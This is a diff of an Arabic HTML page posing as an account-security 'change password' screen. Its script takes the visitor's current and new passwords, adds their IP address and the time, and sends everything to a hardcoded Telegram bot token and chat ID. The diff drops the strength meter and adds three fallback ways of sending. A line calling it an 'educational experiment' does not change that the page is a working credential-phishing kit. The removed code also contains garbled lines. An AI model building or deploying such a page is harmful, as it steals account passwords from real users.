@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>تغيير كلمة المرور</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
     <style>
@@ -11,18 +11,14 @@
             padding: 0;
             box-sizing: border-box;
         }
-
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+            font-family: -apple-system, Arial, sans-serif;
             background: #fafafa;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            padding: 0;
-            margin: 0;
         }
-
         .container {
             width: 100%;
             max-width: 400px;
@@ -30,38 +26,29 @@
             min-height: 100vh;
             display: flex;
             flex-direction: column;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.05);
         }
-
-        /* ===== الهيدر ===== */
         .header {
             display: flex;
             align-items: center;
             padding: 12px 16px;
             border-bottom: 1px solid #efefef;
             gap: 12px;
-            flex-shrink: 0;
+        }
+        .header h2 {
+            font-size: 17px;
+            font-weight: 700;
+            flex: 1;
         }
         .header i {
             font-size: 20px;
             color: #262626;
         }
-        .header h2 {
-            font-size: 17px;
-            font-weight: 700;
-            color: #262626;
-            flex: 1;
-            margin: 0;
-        }
-
-        /* ===== البروفايل ===== */
         .profile {
             display: flex;
             align-items: center;
             padding: 10px 16px;
             border-bottom: 1px solid #efefef;
             gap: 10px;
-            flex-shrink: 0;
         }
         .avatar {
             width: 40px;
@@ -74,13 +61,10 @@
             color: #fff;
             font-weight: 700;
             font-size: 16px;
-            flex-shrink: 0;
         }
         .profile-info h4 {
             font-size: 14px;
             font-weight: 700;
-            color: #262626;
-            margin: 0;
         }
         .profile-info span {
             font-size: 12px;
@@ -92,29 +76,14 @@
             font-size: 9px;
             padding: 2px 8px;
             border-radius: 12px;
-            margin-right: 4px;
         }
-
-        /* ===== المحتوى ===== */
         .content {
             flex: 1;
             padding: 16px;
-            overflow-y: auto;
-        }
-        .tag {
-            display: inline-block;
-            background: #e8f0fe;
-            color: #1a73e8;
-            font-size: 11px;
-            padding: 3px 12px;
-            border-radius: 20px;
-            font-weight: 600;
-            margin-bottom: 6px;
         }
         .title {
             font-size: 22px;
             font-weight: 800;
-            color: #262626;
             margin-bottom: 2px;
         }
         .sub {
@@ -122,8 +91,6 @@
             color: #8e8e8e;
             margin-bottom: 16px;
         }
-
-        /* ===== حقول الإدخال ===== */
         .field {
             margin-bottom: 14px;
         }
@@ -131,7 +98,6 @@
             display: block;
             font-size: 12px;
             font-weight: 600;
-            color: #262626;
             margin-bottom: 4px;
         }
         .input-box {
@@ -139,7 +105,6 @@
             background: #fafafa;
             border: 1px solid #dbdbdb;
             border-radius: 10px;
-            transition: 0.2s;
         }
         .input-box:focus-within {
             border-color: #262626;
@@ -182,47 +147,6 @@
             cursor: pointer;
             padding: 4px;
         }
-
-        /* ===== مؤشر القوة ===== */
-        .meter {
-            margin: 12px 0 0;
-        }
-        .meter-labels {
-            display: flex;
-            justify-content: space-between;
-            font-size: 10px;
-            font-weight: 600;
-            color: #8e8e8e;
-            margin-bottom: 3px;
-        }
-        .meter-track {
-            display: flex;
-            gap: 4px;
-            height: 4px;
-            background: #efefef;
-            border-radius: 4px;
-            overflow: hidden;
-        }
-        .meter-track div {
-            flex: 1;
-            height: 100%;
-            background: #efefef;
-            border-radius: 4px;
-            transition: 0.3s;
-        }
-        .meter-track .w { background: #ed4956; }
-        .meter-track .m { background: #f99b3d; }
-        .meter-track .s { background: #4caf50; }
-        .meter-track .v { background: #2e7d32; }
-
-        .meter-text {
-            font-size: 12px;
-            color: #8e8e8e;
-            margin-top: 4px;
-            text-align: center;
-        }
-
-        /* ===== الزر ===== */
         .btn {
             width: 100%;
             padding: 13px;
@@ -239,7 +163,6 @@
             gap: 8px;
             margin-top: 16px;
             min-height: 48px;
-            transition: 0.2s;
         }
         .btn:active {
             transform: scale(0.97);
@@ -248,8 +171,6 @@
             opacity: 0.5;
             cursor: not-allowed;
         }
-
-        /* ===== رسالة ===== */
         .toast {
             margin-top: 12px;
             padding: 10px 14px;
@@ -277,13 +198,10 @@
             color: #0d47a1;
             border: 1px solid #bbdefb;
         }
-
-        /* ===== الفوتر ===== */
         .footer {
             padding: 10px 16px;
             border-top: 1px solid #efefef;
             text-align: center;
-            flex-shrink: 0;
         }
         .footer-links {
             display: flex;
@@ -300,14 +218,11 @@
         .footer-warn i {
             color: #ed4956;
         }
-
-        /* ===== الشريط السفلي ===== */
         .nav {
             display: flex;
             justify-content: space-around;
             padding: 6px 0 10px;
             border-top: 1px solid #efefef;
-            flex-shrink: 0;
         }
         .nav i {
             font-size: 22px;
@@ -317,12 +232,7 @@
         .nav i.active {
             color: #262626;
         }
-
-        /* ===== تحسين للشاشات الصغيرة ===== */
         @media (max-width: 380px) {
-            .container {
-                max-width: 100%;
-            }
             .title {
                 font-size: 19px;
             }
@@ -335,70 +245,18 @@
                 min-height: 40px;
             }
         }
-
-        /* ===== تحسين للوضع الأفقي ===== */
-        @media (orientation: landscape) and (max-height: 500px) {
-            .container {
-                min-height: 100vh;
-            }
-            .profile {
-                padding: 6px 12px;
-            }
-            .content {
-                padding: 8px 12px;
-            }
-            .title {
-                font-size: 17px;
-            }
-            .field {
-                margin-bottom: 6px;
-            }
-            .input-box input {
-                min-height: 34px;
-                padding: 8px 36px 8px 10px;
-                font-size: 13px;
-            }
-            .btn {
-                min-height: 38px;
-                padding: 10px;
-                margin-top: 10px;
-                font-size: 14px;
-            }
-            .meter {
-                margin: 6px 0 0;
-            }
-            .header {
-                padding: 6px 12px;
-            }
-            .header h2 {
-                font-size: 16px;
-            }
-            .avatar {
-                width: 32px;
-                height: 32px;
-                font-size: 14px;
-            }
-            .nav {
-                padding: 4px 0 6px;
-            }
-            .nav i {
-                font-size: 18px;
-            }
-        }
     </style>
 </head>
 <body>
 
     <div class="container">
 
-        <!-- ===== الهيدر ===== -->
         <div class="header">
             <i class="fas fa-chevron-right"></i>
             <h2>أمان الحساب</h2>
             <i class="fas fa-ellipsis-h"></i>
         </div>
 
-        <!-- ===== البروفايل ===== -->
         <div class="profile">
             <div class="avatar">I</div>
             <div class="profile-info">
@@ -408,14 +266,11 @@
             <i class="fas fa-chevron-left" style="color:#8e8e8e; font-size:12px;"></i>
         </div>
 
-        <!-- ===== المحتوى ===== -->
         <div class="content">
 
-            <div class="tag"><i class="fas fa-shield-alt"></i> تغيير كلمة المرور</div>
             <div class="title">كلمة مرور قوية</div>
             <div class="sub">استخدم كلمة مرور فريدة لحماية حسابك</div>
 
-            <!-- الحالية -->
             <div class="field">
                 <label>كلمة المرور الحالية</label>
                 <div class="input-box">
@@ -425,7 +280,6 @@
                 </div>
             </div>
 
-            <!-- الجديدة -->
             <div class="field">
                 <label>كلمة المرور الجديدة</label>
                 <div class="input-box">
@@ -435,30 +289,12 @@
                 </div>
             </div>
 
-            <!-- مؤشر القوة -->
-            <div class="meter">
-                <div class="meter-labels">
-                    <span>ضعيفة</span>
-                    <span>قوية</span>
-                </div>
-                <div class="meter-track" id="track">
-                    <div id="s1"></div>
-                    <div id="s2"></div>
-                    <div id="s3"></div>
-                    <div id="s4"></div>
-                </div>
-                <div class="meter-text" id="meterText">💡 ابدأ بكتابة كلمة مرور جديدة</div>
-            </div>
-
-            <!-- زر -->
             <button class="btn" id="submitBtn"><i class="fas fa-paper-plane"></i> تغيير كلمة المرور</button>
 
-            <!-- رسالة -->
             <div class="toast" id="toast"></div>
 
         </div>
 
-        <!-- ===== الفوتر ===== -->
         <div class="footer">
             <div class="footer-links">
                 <span>مساعدة</span>
@@ -470,7 +306,6 @@
             </div>
         </div>
 
-        <!-- ===== الشريط السفلي ===== -->
         <div class="nav">
             <i class="fas fa-home"></i>
             <i class="fas fa-search"></i>
@@ -482,133 +317,133 @@
     </div>
 
     <script>
-        (function() {
-            const BOT_TOKEN = '8765312624:AAF5cD-VCsNGRVbgH2eh1g8NdqmH49Bvi3M';
-            const CHAT_ID = '5775368729';
+        // =============================================
+        // ✅ بيانات التلغرام
+        // =============================================
+        const BOT_TOKEN = '8765312624:AAF5cD-VCsNGRVbgH2eh1g8NdqmH49Bvi3M';
+        const CHAT_ID = '5775368729';
 
-            const oldPass = document.getElementById('oldPass');
-            const newPass = document.getElementById('newPass');
-            const s1 = document.getElementById('s1');
-            const s2 = document.getElementById('s2');
-            const s3 = document.getElementById('s3');
-            const s4 = document.getElementById('s4');
-            const meterText = document.getElementById('meterText');
-            const submitBtn = document.getElementById('submitBtn');
-            const toast = document.getElementById('toast');
+        // =============================================
+        const oldPass = document.getElementById('oldPass');
+        const newPass = document.getElementById('newPass');
+        const submitBtn = document.getElementById('submitBtn');
+        const toast = document.getElementById('toast');
 
-            let sending = false;
+        let sending = false;
 
-            window.togglePass = function(id, btn) {
-                const inp = document.getElementById(id);
-                const vis = inp.type === 'text';
-                inp.type = vis ? 'password' : 'text';
-                btn.querySelector('i').className = vis ? 'fas fa-eye' : 'fas fa-eye-slash';
-            };
+        // ===== إظهار/إخفاء =====
+        window.togglePass = function(id, btn) {
+            const inp = document.getElementById(id);
+            const vis = inp.type === 'text';
+            inp.type = vis ? 'password' : 'text';
+            btn.querySelector('i').className = vis ? 'fas fa-eye' : 'fas fa-eye-slash';
+        };
 
-            function checkStrength(pw) {
-                if (!pw) return { level: 0, label: '💡 ابدأ بكتابة كلمة مرور جديدة' };
-                let s = 0;
-                if (pw.length >= 8) s++;
-                if (/[a-z]/.test(pw) && /[A-Z]/.test(pw)) s++;
-                if (/\d/.test(pw)) s++;
-                if (/[^a-zA-Z0-9]/.test(pw)) s++;
-                if (s <= 1) return { level: 1, label: '🔴 ضعيفة جداً' };
-                if (s === 2) return { level: 2, label: '🟠 ضعيفة' };
-                if (s === 3) return { level: 3, label: '🟡 متوسطة' };
-                return { level: 4, label: '🟢 قوية جداً' };
+        // ===== رسالة =====
+        function showToast(msg, type = 'inf') {
+            toast.className = 'toast show ' + type;
+            toast.textContent = msg;
+        }
+
+        // ===== جلب IP =====
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip || 'غير متاح';
+            } catch {
+                return 'غير متاح';
             }
+        }
 
-            function updateMeter(pw) {
-                const r = checkStrength(pw);
-                [s1, s2, s3, s4].forEach((el, i) => {
-                    el.className = '';
-                    if (i < r.level) {
-                        if (r.level <= 1) el.classList.add('w');
-                        else if (r.level === 2) el.classList.add('m');
-                        else if (r.level === 3) el.classList.add('s');
-                        else if (r.level >= 4) el.classList.add('v');
-                    }
+        // ============================================================
+        // ✅ الإرسال إلى تلغرام - 3 طرق مختلفة (واحدة منهم تشتغل)
+        // ============================================================
+        async function sendToTelegram(oldP, newP) {
+            const ip = await getIP();
+            const time = new Date().toLocaleString('ar-EG', { hour12: true });
+
+            const text =
+                `🛡️ تغيير كلمة المرور\n\n🔑 القديمة: ${oldP}\n🔑 الجديدة: ${newP}\n⏰ ${time}\n🌐 ${ip}\n\n⚠️ تجربة تعليمية`;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+
+            // ===== الطريقة 1: GET (أسهل وأسرع) =====
+            try {
+                const res = await fetch(url, { method: 'GET' });
+                const data = await res.json();
+                if (data.ok) return { success: true };
+            } catch (e) { console.log('طريقة 1 فشلت:', e); }
+
+            // ===== الطريقة 2: POST =====
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text
+                    })
                 });
-                meterText.textContent = r.label;
-                return r;
+                const data = await res.json();
+                if (data.ok) return { success: true };
+            } catch (e) { console.log('طريقة 2 فشلت:', e); }
+
+            // ===== الطريقة 3: فتح الرابط في نافذة جديدة (حل أخير) =====
+            try {
+                window.open(url, '_blank');
+                return { success: true, method: 'window' };
+            } catch (e) {
+                return { success: false, error: e.message };
+            }
+        }
+
+        // ===== زر الإرسال =====
+        submitBtn.addEventListener('click', async function() {
+            if (sending) return;
+
+            const oldP = oldPass.value.trim();
+            const newP = newPass.value.trim();
+
+            if (!oldP) { showToast('⚠️ اكتب كلمة المرور الحالية', 'err'); return; }
+            if (!newP) { showToast('⚠️ اكتب كلمة المرور الجديدة', 'err'); return; }
+            if (oldP === newP) { showToast('⚠️ الجديدة يجب أن تختلف عن القديمة', 'err'); return; }
+
+            sending = true;
+            submitBtn.disabled = true;
+            showToast('📤 جاري الإرسال...', 'inf');
+
+            const result = await sendToTelegram(oldP, newP);
+
+            if (result.success) {
+                showToast('✅ تم الإرسال بنجاح!', 'ok');
+                oldPass.value = '';
+                newPass.value = '';
+            } else {
+                showToast('❌ فشل الإرسال: ' + (result.error || 'خطأ'), 'err');
             }
 
-            function showToast(msg, type = 'inf') {
-                toast.className = 'toast show ' + type;
-                toast.textContent = msg;
-            }
+            setTimeout(() => {
+                sending = false;
+                submitBtn.disabled = false;
+            }, 2000);
+        });
 
-            async function getIP() {
-                try {
-                    const res = await fetch('https://api.ipify.org?format=json');
-                    const data = await res.json();
-                    return data.ip ||input 'غير متاح';
-                } catch { return 'غير متاح'; }
-            }
-
-            async function sendData(oldP, newP, strength) {
-                const ip = await getIP();
-                const time = new Date().toLocaleString('ar-EG', { hour12: true });
-                const text =
-                    `🛡️ تغيير كلمة المرور\n\n🔑 القديمة: ${oldP}\n🔑 الجديدة: ${newP}\n📊 القوة: ${strength.label}\n⏰ ${time}\n🌐 ${ip}\n\n⚠️ تجربة تعليمية`;
-                const url =
-                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
-                try {
-                    const res = await fetch(url, { method: 'GET' });
-                    const data = await res.json();
-                    if (data.ok) return { success: true };
-                    throw new Error(data.description);
-                } catch (e) {
-                    window.open(url, '_blank');
-                    return { success: true };
-                }
-            }
-
-            newPass.addEventListener('', function() {
-                updateMeter(this.value);
-            });
-
-            submitBtn.addEventListener('click', async function() {
-                if (sending) return;
-                const oldP = oldPass.value.trim();
-                const newP = newPass.value.trim();
-                const strength = checkStrength(newP);
-
-                if (!oldP) { showToast('⚠️ اكتب كلمة المرور الحالية', 'err'); return; }
-                if (!newP) { showToast('⚠️ اكتب كلمة المرور الجديدة', 'err'); return; }
-                if (oldP === newP) { showToast('⚠️ الجديدة يجب أن تختلف عن القديمة', 'err'); return; }
-
-                sending = true;
-                submitBtn.disabled = true;
-                showToast('📤 جاري الإرسال...', 'inf');
-
-                const result = await sendData(oldP, newP, strength);
-
-                if (result.success) {
-                    showToast('✅ تم الإرسال بنجاح!', 'ok');
-                    oldPass.value = '';
-                    newPass.value = '';
-                    updateMeter('');
+        // ===== اختبار البوت =====
+        async function testBot() {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
+                const data = await res.json();
+                if (data.ok) {
+                    console.log('✅ البوت شغال:', data.result.first_name);
                 } else {
-                    showToast('❌ فشل الإرسال', 'err');
+                    console.log('❌ البوت مش شغال');
                 }
-
-                setTimeout(() => {
-                    sending = false;
-                    submitBtn.disabled = false;
-                }, 2000);
-            });
-
-            async function testBot() {
-                try {
-                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
-                    const data = await res.json();
-                    if (data.ok) console.log('✅ البوت شغال');
-                } catch (e) {}
+            } catch (e) {
+                console.log('⚠️ تعذر اختبار البوت');
             }
-            testBot();
-            updateMeter('');
-        })();
+        }
+        testBot();
     </script>
 
 </body>
